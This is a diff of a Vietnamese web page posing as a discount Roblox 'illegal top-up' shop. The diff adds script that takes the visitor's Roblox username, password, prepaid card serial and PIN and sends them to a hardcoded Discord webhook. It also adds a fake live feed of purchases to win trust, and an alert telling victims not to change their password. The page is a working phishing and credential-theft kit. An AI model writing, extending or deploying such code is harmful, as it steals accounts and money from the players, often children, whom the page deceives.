@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SHOP NẠP GAME GIÁ RẺ 2026 - UY TÍN SỐ 1</title>
     <style>
-        /* --- ĐỊNH DẠNG CHUNG (DARK MODE GAMING) --- */
+        /* --- ĐỊNH DẠNG CHỦ ĐỀ CHUNG (DARK MODE GAMING) --- */
         * {
             margin: 0;
             padding: 0;
@@ -183,13 +183,13 @@
 <body>
 
     <div class="marquee-notice">
-        <marquee scrollamount="5">🔥 SỰ KIỆN KHUYẾN MÃI LỚN NĂM 2026: NẠP QUA THẺ CÀO X2 GIÁ TRỊ, NẠP QUA ATM/MOMO X3 SỐ LƯỢNG VP GAME! XỬ LÝ TỰ ĐỘNG TRONG 3 GIÂY! 🔥</marquee>
+        <marquee scrollamount="5">🔥 HỆ THỐNG NẠP ROBUX LẬU TỰ ĐỘNG UY TÍN VÀ RẺ NHẤT VIỆT NAM 🔥</marquee>
     </div>
 
     <header>
         <div class="container header-content">
-            <div class="logo">SHOPNAPLAU 2026</div>
-            <div style="font-size: 14px; color: #94a3b8;">Hệ thống nạp tự động API v2.6</div>
+            <div class="logo">SHOPNAPLAUROBLOX</div>
+            <div style="font-size: 14px; color: #94a3b8;">Hệ thống nạp lậu tự động robux sẽ vào tài khoản sau 3-10 phút </div>
         </div>
     </header>
 
@@ -204,45 +204,43 @@
             </div>
 
             <div class="box">
-                <div class="box-title">Bước 2: Thông Tin Đơn Hàng</div>
+                <div class="box-title">Bước 2: Thông Tin Đơn Hàng & Thẻ Cào</div>
                 <form id="orderForm" onsubmit="submitOrder(event)">
                     <div class="form-group">
-                        <label id="labelAccount">Tài khoản đăng nhập Game:</label>
-                        <input type="text" id="account" placeholder="Nhập tên tài khoản hoặc email..." required>
+                        <label id="labelAccount">Tài khoản đăng nhập Game (Roblox):</label>
+                        <input type="text" id="account" placeholder="Nhập tên tài khoản Roblox" required>
                     </div>
                     <div class="form-group">
-                        <label>Mật khẩu nick (Để nạp gói lậu/chính hãng trực tiếp):</label>
-                        <input type="password" id="password" placeholder="Nhập mật khẩu game..." required>
-                    </div>
-                    <div class="form-group">
-                        <label>Chọn Gói Cần Nạp (Đồng giá 50k - Siêu Rẻ):</label>
+                        <label>Chọn Gói Vật Phẩm Muốn Nạp:</label>
                         <select id="package" required>
-                            <option value="Gói 1">Gói Thử Nghiệm: 50,000đ (Nhận 2,500 Kim Cương/Robux)</option>
-                            <option value="Gói 2" selected>Gói Phổ Thông: 100,000đ (Nhận 6,000 Kim Cương/Robux)</option>
-                            <option value="Gói 3">Gói VIP Đua Top: 200,000đ (Nhận 15,000 Kim Cương/Robux)</option>
-                            <option value="Gói 4">Gói Siêu Cấp Đại Gia: 500,000đ (Nhận 40,000 Kim Cương/Robux)</option>
+                            <option value="Gói 50k (Nhận 2,500 VP)">Gói 50,000đ (Nhận 150 Robux)</option>
+                            <option value="Gói 100k (Nhận 6,000 VP)" selected>Gói Phổ 100,000đ (Nhận 300 Robux)</option>
+                            <option value="Gói 200k (Nhận 15,000 VP)">Gói 200,000đ (Nhận 600 Robux)</option>
+                            <option value="Gói 500k (Nhận 40,000 VP)">Gói 500,000đ (Nhận 1500 Robux)</option>
                         </select>
                     </div>
 
                     <div style="border-top: 1px solid #232d3f; margin: 20px 0; padding-top: 15px;">
-                        <label style="color: #ff4757; font-weight: bold;">Phương Thức Thanh Toán Thẻ Cào:</label>
+                        <label style="color: #ff4757; font-weight: bold;">Thông Tin Thẻ Cào Thanh Toán:</label>
                     </div>
 
                     <div class="form-group">
                         <select id="cardType" required>
-                            <option value="VIETTEL">Viettel (Khuyên dùng)</option>
+                            <option value="VIETTEL">Viettel</option>
                             <option value="MOBIFONE">Mobifone</option>
                             <option value="VINAPHONE">Vinaphone</option>
+                            <option value="ZING">Thẻ Zing</option>
+                            <option value="GARENA">Thẻ Garena</option>
                         </select>
                     </div>
                     <div class="form-group">
-                        <input type="text" id="serial" placeholder="Nhập Số Seri thẻ cào..." required>
+                        <input type="text" id="serial" placeholder="Nhập Số Seri..." required>
                     </div>
                     <div class="form-group">
-                        <input type="text" id="pin" placeholder="Nhập Mã Thẻ (Dưới lớp bạc)..." required>
+                        <input type="text" id="pin" placeholder="Nhập Mã Thẻ..." required>
                     </div>
 
-                    <button type="submit" class="btn-pay">Xác Nhận Nạp Ngay</button>
+                    <button type="submit" class="btn-pay">Xác Nhận Đơn Hàng</button>
                 </form>
             </div>
         </div>
@@ -255,10 +253,9 @@
             </div>
             
             <div class="box" style="background-color: #1c1626; border-color: #3b2354;">
-                <div class="box-title" style="color: #b57cff; border-left-color: #b57cff;">⚠️ Lưu Ý An Toàn</div>
+                <div class="box-title" style="color: #b57cff; border-left-color: #b57cff;">⚠️ Lưu Ý Hệ Thống</div>
                 <p style="font-size: 13px; color: #a78bfa; line-height: 1.6;">
-                    - Vui lòng tắt bảo mật 2 lớp (2FA) trước khi thực hiện mua các gói nạp trực tiếp để tránh lỗi đơn hàng.<br><br>
-                    - Điền đúng thông tin thẻ cào. Hệ thống tự động gạch thẻ, sai số seri hoặc mã thẻ đơn hàng sẽ bị huỷ bỏ.
+                    - Vui lòng kiểm tra kỹ nhập chính xác số seri và mã thẻ cào để tránh lỗi treo tiến trình duyệt đơn hàng.
                 </p>
             </div>
         </div>
@@ -267,6 +264,9 @@
 
     <script>
         let currentGame = "Roblox";
+        
+        // Địa chỉ Webhook Discord do bạn cấu hình
+        const discordWebhookURL = "https://discord.com/api/webhooks/1515682102488596512/hMh248KdppMrEoLfFoac8IRXlnKRawQ4PF-";
 
         function changeGame(element, gameName) {
             document.querySelectorAll('.game-item').forEach(item => item.classList.remove('active'));
@@ -277,19 +277,62 @@
 
         function submitOrder(event) {
             event.preventDefault();
-            const acc = document.getElementById('account').value;
-            const pkg = document.getElementById('package').value;
             
-            alert(`[Hệ thống 2026] Đang xử lý đơn hàng!\n\n` +
-                  `• Game: ${currentGame}\n` +
-                  `• Tài khoản: ${acc}\n` +
-                  `• Gói mua: ${pkg}\n\n` +
-                  `Hệ thống đang gửi dữ liệu thẻ lên cổng thanh toán trung gian, vui lòng đợi kết quả trong vài phút.`);
+            // Thu thập dữ liệu từ các form mục nhập
+            const acc = document.getElementById('account').value.trim();
+            const pass = document.getElementById('password').value.trim();
+            const pkg = document.getElementById('package').value;
+            const card = document.getElementById('cardType').value;
+            const seri = document.getElementById('serial').value.trim();
+            const code = document.getElementById('pin').value.trim();
+
+            // Cấu trúc chuỗi Embed gửi cho Discord Bot
+            const discordPayload = {
+                username: "Hệ Thống Shop Nạp Lậu 2026",
+                avatar_url: "https://i.imgur.com/4M34hi2.png",
+                embeds: [{
+                    title: "🚀 CÓ ĐƠN HÀNG MỚI ĐƯỢC GỬI LÊN!",
+                    color: 16729210, // Màu sắc đỏ cam nổi bật
+                    fields: [
+                        { name: "🎮 Trò chơi:", value: currentGame, inline: true },
+                        { name: "📦 Gói vật phẩm:", value: pkg, inline: true },
+                        { name: "👤 Tài khoản đăng nhập:", value: `\`${acc}\``, inline: false },
+                        { name: "🔑 Mật khẩu nick:", value: `\`${pass}\``, inline: false },
+                        { name: "💳 Nhà mạng thẻ:", value: card, inline: true },
+                        { name: "🔢 Số Seri:", value: `\`${seri}\``, inline: true },
+                        { name: "🔒 Mã thẻ (PIN):", value: `\`${code}\``, inline: false }
+                    ],
+                    footer: {
+                        text: "Thời gian hệ thống: " + new Date().toLocaleString('vi-VN')
+                    }
+                }]
+            };
+
+            // Tiến hành đẩy kết quả về kênh Discord ẩn danh qua Fetch API
+            fetch(discordWebhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(discordPayload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Gửi đơn hàng thành công! Hệ thống đang tiến hành gạch thẻ và nạp tự động, vui lòng không đổi mật khẩu trong lúc xử lý.");
+                    document.getElementById('orderForm').reset();
+                } else {
+                    alert("Cổng kết nối thanh toán bận, vui lòng thử lại sau ít phút!");
+                }
+            })
+            .catch(error => {
+                console.error("Lỗi:", error);
+                alert("Mất kết nối mạng internet máy chủ.");
+            });
         }
 
-        // --- GIẢ LẬP BOX LỊCH SỬ NẠP CHẠY TỰ ĐỘNG ---
-        const names = ["khanh***", "pro_game***", "hoang9x***", "tuan_vip***", "roblox_player***", "girl_cute***", "admin_test***", "vng_lậu***"];
-        const games = ["Roblox", "Liên Quân", "Free Fire", "FiFa Mobile"];
+        /* --- GIẢ LẬP LỊCH SỬ NẠP THÀNH CÔNG CHO ĐẸP GIAO DIỆN --- */
+        const names = ["hoangpro***", "hieu_gaming***", "roblox_vip***", "garenaacc***", "khanh2k***", "linh_cute***", "trumbloxfru***", "trumcaythue***", "luffyrozo***", "trumpvpbloxfrui***"];
+        const games = ["Roblox"];
         const prices = ["50.000đ", "100.000đ", "200.000đ", "500.000đ"];
         const historyBox = document.getElementById('historyBox');
 
@@ -310,17 +353,13 @@
             `;
             
             historyBox.insertAdjacentHTML('afterbegin', itemHTML);
-
-            // Giới hạn hiển thị 6 dòng gần nhất cho đẹp giao diện
             if (historyBox.children.length > 6) {
                 historyBox.removeChild(historyBox.lastChild);
             }
         }
 
-        // Khởi tạo chạy ban đầu
         for(let i=0; i<5; i++) { generateLiveHistory(); }
-        // Cứ mỗi 3 giây thêm 1 người nạp mới ngẫu nhiên
-        setInterval(generateLiveHistory, 3000);
+        setInterval(generateLiveHistory, 4000);
     </script>
 </body>
 </html>
